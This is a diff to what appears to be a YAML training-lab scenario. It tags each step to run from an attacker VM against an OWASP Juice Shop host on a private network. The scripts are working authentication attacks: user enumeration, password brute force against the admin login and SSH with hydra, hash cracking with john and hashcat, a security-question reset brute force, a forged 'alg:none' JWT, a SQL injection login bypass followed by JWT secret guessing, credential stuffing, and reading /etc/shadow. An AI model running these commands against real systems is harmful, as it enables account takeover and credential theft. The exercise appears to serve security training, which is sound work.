@@ -23,6 +23,7 @@ steps:
     type: output_contains
     expect: '@'
     field: stdout
+  target_vm: attacker
   script: curl -s http://10.20.30.80:3000/api/Users | python3 -c "import sys,json; [print(u['email']) for u in json.load(sys.stdin)['data']]" > /tmp/users.txt && cat /tmp/users.txt
   risk_level: low
 - order: 2
@@ -37,6 +38,7 @@ steps:
     type: output_contains
     expect: Trying
     field: stdout
+  target_vm: attacker
   script: 'for pw in admin admin123 password 12345 admin1234; do echo -n "Trying: $pw -> "; curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"$pw\"}"
     | python3 -c "import sys,json; d=json.load(sys.stdin); print(''SUCCESS'' if ''authentication'' in d else ''FAIL'')"; done'
   risk_level: medium
@@ -51,6 +53,7 @@ steps:
     type: output_contains
     expect: hydra
     field: stdout
+  target_vm: attacker
   script: head -100 /usr/share/wordlists/rockyou.txt > /tmp/top100.txt 2>/dev/null; hydra -l web -P /tmp/top100.txt ssh://10.20.30.80 -t 4 -f
   risk_level: medium
 - order: 4
@@ -64,6 +67,7 @@ steps:
     type: output_contains
     expect: admin123
     field: stdout
+  target_vm: attacker
   script: echo -n 'admin123' | md5sum | awk '{print $1}' > /tmp/hash.txt && john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hash.txt 2>/dev/null; john --format=raw-md5 --show /tmp/hash.txt
   risk_level: medium
 - order: 5
@@ -78,6 +82,7 @@ steps:
     type: output_contains
     expect: 'Answer:'
     field: stdout
+  target_vm: attacker
   script: 'for ans in ''replicator'' ''Mr. Robot'' ''Jim'' ''Samuel''; do echo -n "Answer: $ans -> "; curl -s -X POST http://10.20.30.80:3000/rest/user/reset-password -H ''Content-Type: application/json''
     -d "{\"email\":\"admin@juice-sh.op\",\"answer\":\"$ans\",\"new\":\"hacked123\",\"repeat\":\"hacked123\"}" | head -c 100; echo; done'
   risk_level: medium
@@ -93,6 +98,7 @@ steps:
     type: output_contains
     expect: none
     field: stdout
+  target_vm: attacker
   script: python3 -c "import base64,json; h=base64.urlsafe_b64encode(json.dumps({'typ':'JWT','alg':'none'}).encode()).rstrip(b'=').decode(); p=base64.urlsafe_b64encode(json.dumps({'status':'success','data':{'id':1,'email':'admin@juice-sh.op','role':'admin'},'iat':1700000000}).encode()).rstrip(b'=').decode();
     print(f'{h}.{p}.')"
   risk_level: medium
@@ -108,6 +114,7 @@ steps:
     type: output_contains
     expect: 'Hash:'
     field: stdout
+  target_vm: attacker
   script: 'echo -n ''password'' | sha256sum | awk ''{print $1}'' > /tmp/sha256.txt && hashcat -m 1400 /tmp/sha256.txt /usr/share/wordlists/rockyou.txt --force 2>/dev/null | tail -5; echo ''Hash: ''$(cat
     /tmp/sha256.txt)'
   risk_level: medium
@@ -124,6 +131,7 @@ steps:
     type: output_contains
     expect: 'Key:'
     field: stdout
+  target_vm: attacker
   script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' OR 1=1--","password":"a"}'' | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
     && python3 -c "import hmac,hashlib,base64,sys; t=''$TOKEN''; parts=t.split(''.''); header_payload=parts[0]+''.''+parts[1]; sig=parts[2]; secrets=[''secret'',''1234'',''password'',''jwt_secret'',''key''];
     [print(f''Key: {s} -> Match: {base64.urlsafe_b64encode(hmac.new(s.encode(),header_payload.encode(),hashlib.sha256).digest()).rstrip(b"=").decode()==sig}'') for s in secrets]"'
@@ -139,6 +147,7 @@ steps:
     type: output_contains
     expect: 'Public Key:'
     field: stdout
+  target_vm: attacker
   script: ssh-keygen -t ed25519 -f /tmp/test_key -N '' -q && echo 'Public Key:' && cat /tmp/test_key.pub && echo 'Key fingerprint:' && ssh-keygen -lf /tmp/test_key
   risk_level: low
 - order: 10
@@ -154,6 +163,7 @@ steps:
     type: output_contains
     expect: ->
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''admin@juice-sh.op:admin123\njim@juice-sh.op:ncc-1701\nbender@juice-sh.op:bender\nmc.safesearch@juice-sh.op:Mr. N00dles'' > /tmp/creds.txt && while IFS=: read -r email pw; do echo -n
     "$email -> "; curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d "{\"email\":\"$email\",\"password\":\"$pw\"}" | python3 -c "import sys,json; d=json.load(sys.stdin);
     print(''SUCCESS'' if ''authentication'' in d else ''FAIL'')" 2>/dev/null; done < /tmp/creds.txt'
@@ -170,6 +180,7 @@ steps:
     type: output_contains
     expect: 'User:'
     field: stdout
+  target_vm: attacker
   script: 'sudo cat /etc/shadow | grep -v ''!'' | grep -v ''*'' | head -5 | while read line; do user=$(echo $line | cut -d: -f1); hash=$(echo $line | cut -d: -f2); algo=$(echo $hash | cut -d''$'' -f2);
     echo "User: $user, Algorithm: $algo"; done'
   risk_level: low
@@ -184,6 +195,7 @@ steps:
     type: output_contains
     expect: NTLM hash
     field: stdout
+  target_vm: attacker
   script: python3 -c "import hashlib; print('NTLM hash of password:', hashlib.new('md4', 'password'.encode('utf-16-le')).hexdigest())"
   risk_level: low
 - order: 13
@@ -197,6 +209,7 @@ steps:
     type: output_contains
     expect: question
     field: stdout
+  target_vm: attacker
   script: curl -s 'http://10.20.30.80:3000/rest/user/security-question?email=admin@juice-sh.op' | python3 -m json.tool
   risk_level: low
 - order: 14
@@ -211,6 +224,7 @@ steps:
     type: output_contains
     expect: Attempt 10
     field: stdout
+  target_vm: attacker
   script: 'for i in $(seq 1 10); do STATUS=$(curl -s -o /dev/null -w ''%{http_code}'' -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"admin@juice-sh.op","password":"wrong''$i''"}'');
     echo "Attempt $i: HTTP $STATUS"; done'
   risk_level: low
@@ -228,6 +242,7 @@ steps:
     type: output_contains
     expect: Authentication Attack Report
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== Authentication Attack Report ===\n\n[Compromised Accounts]\n- admin@juice-sh.op: SQL Injection bypass\n- Multiple accounts: credential stuffing\n\n[Vulnerabilities]\n1. No rate
     limiting on login API\n2. Weak password policy\n3. Security question answers guessable\n4. JWT secret key weakness\n5. User enumeration via API\n\n[Recommendations]\n1. Implement account lockout after
     5 failed attempts\n2. Enforce strong password policy (min 12 chars, complexity)\n3. Replace security questions with MFA\n4. Use strong random JWT signing key (256+ bits)\n5. Restrict /api/Users endpoint''
